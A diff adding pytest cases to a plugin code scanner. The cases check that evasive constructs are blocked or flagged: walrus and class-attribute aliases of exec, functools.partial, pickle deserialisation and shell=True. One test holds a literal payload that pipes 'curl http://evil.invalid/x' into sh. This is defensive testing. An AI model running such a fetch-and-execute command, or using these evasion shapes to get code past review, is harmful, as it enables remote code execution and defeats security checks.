@@ -722,3 +722,138 @@ def test_a_manifest_without_entry_points_is_never_safe(tmp_path) -> None:
     assert result.verdict == "review", _reasons(result)
     assert "entry_points" in _reasons(result)
     assert "GROUP granularity" in _reasons(result)
+
+
+# ==========================================================================
+# N-1 — the six constructs that still returned `safe` after round 1
+#
+# The re-review threw twelve more shapes at the binding table. Five came back
+# `review` (acceptable — the operator accepts out loud either way) and six were
+# silent. Three of those are mechanical and closed here; the other three were
+# the acknowledged control-flow limit, and two of them turned out to fall out of
+# the binding table cheaply once class bodies were walked.
+# ==========================================================================
+
+
+def test_a_walrus_binding_is_a_binding(tmp_path) -> None:
+    """``e = exec`` was blocked and ``(e := exec)`` was not, four lines apart in
+    the same visitor."""
+    code = "def f(c):\n    return (e := exec)(c)\n" + _CLEAN_CODE
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "exec" in _reasons(result)
+
+
+def test_a_class_attribute_binding_is_a_binding(tmp_path) -> None:
+    """``class C: e = exec`` then ``C.e(c)``. A class body is straight-line
+    assignment with a prefix, so it costs one visitor to see."""
+    code = "class C:\n    e = exec\n\n\ndef f(c):\n    return C.e(c)\n" + _CLEAN_CODE
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "exec" in _reasons(result)
+
+
+def test_a_class_attribute_holding_os_system_is_a_binding(tmp_path) -> None:
+    code = (
+        "import os\n\n\nclass C:\n    run = os.system\n\n\ndef f(c):\n    return C.run(c)\n"
+        + _CLEAN_CODE
+    )
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "os.system" in _reasons(result)
+
+
+def test_a_literal_payload_to_exec_is_scanned_as_code(tmp_path) -> None:
+    """The cheapest bypass in the file: the rule blocked only NON-literal input,
+    so ``exec("import os\\nos.system(...)")`` fell through with no finding at
+    all. A literal is not safe because it is readable -- it is safe only if
+    somebody reads it, so now something does."""
+    payload = "exec(\"import os\\nos.system('curl http://evil.invalid/x | sh')\")\n"
+    result = _scanned(tmp_path, code=payload + _CLEAN_CODE)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "os.system" in _reasons(result)
+
+
+def test_an_inert_literal_exec_is_review_not_blocked(tmp_path) -> None:
+    """``exec("X = 1")`` is inert and appears in real packaging shims, so it must
+    not block -- but executing a string at all is worth a sentence."""
+    code = 'exec("X = 1")\n' + _CLEAN_CODE
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "review", _reasons(result)
+    assert "string literal" in _reasons(result)
+
+
+def test_a_literal_that_is_not_parseable_code_is_blocked(tmp_path) -> None:
+    """If the scan cannot read the string it is about to execute, it has not
+    looked -- which is never `safe` and, for code, never `review` either."""
+    code = 'exec("def broken(:")\n' + _CLEAN_CODE
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "code in a string" in _reasons(result)
+
+
+@pytest.mark.parametrize("module", ["pickle", "marshal", "shelve", "dill"])
+def test_the_deserialisation_family_is_at_least_review(tmp_path, module) -> None:
+    """``pickle.loads`` on untrusted bytes is arbitrary code execution by
+    design, and none of these modules was in any table."""
+    code = f"import {module}\nPLUGIN = {{'handlers': {{}}}}\n"
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict in ("review", "blocked"), _reasons(result)
+    assert module in _reasons(result)
+
+
+@pytest.mark.parametrize(
+    "call",
+    [
+        "pickle.loads(data)",
+        "marshal.loads(data)",
+        "pickle.load(handle)",
+    ],
+)
+def test_deserialising_non_literal_input_is_blocked(tmp_path, call) -> None:
+    module = call.split(".", 1)[0]
+    code = f"import {module}\n\n\ndef f(data, handle):\n    return {call}\n" + _CLEAN_CODE
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert module in _reasons(result)
+
+
+# ==========================================================================
+# N-4 — shell=True must fire whatever the callee is
+# ==========================================================================
+
+
+def test_functools_partial_carries_its_callee(tmp_path) -> None:
+    """``functools.partial(exec)`` evaluates to something that calls exec."""
+    code = (
+        "import functools\n\n\nrun = functools.partial(exec)\n\n\ndef f(c):\n    return run(c)\n"
+        + _CLEAN_CODE
+    )
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "exec" in _reasons(result)
+
+
+@pytest.mark.parametrize(
+    "call",
+    [
+        "subprocess.run(c, shell=True)",
+        "get()(c, shell=True)",
+        "runner(c, shell=True)",
+        "self.thing.go(c, shell=True)",
+        "FACTORIES['x'](c, shell=True)",
+    ],
+)
+def test_shell_true_is_blocked_whatever_the_callee(tmp_path, call) -> None:
+    """The check sat BELOW ``if not target: return``, so a callee that resolved
+    to "" -- a call returning a callable, an attribute chain off self -- was
+    never checked. A keyword that hands a string to a shell is a finding about
+    the ARGUMENT, not about the name in front of it."""
+    code = (
+        "import subprocess\n\n\ndef get():\n    return subprocess.run\n\n\n"
+        "FACTORIES = {}\nrunner = None\nself = None\n\n\n"
+        f"def f(c):\n    return {call}\n" + _CLEAN_CODE
+    )
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "shell=True" in _reasons(result)
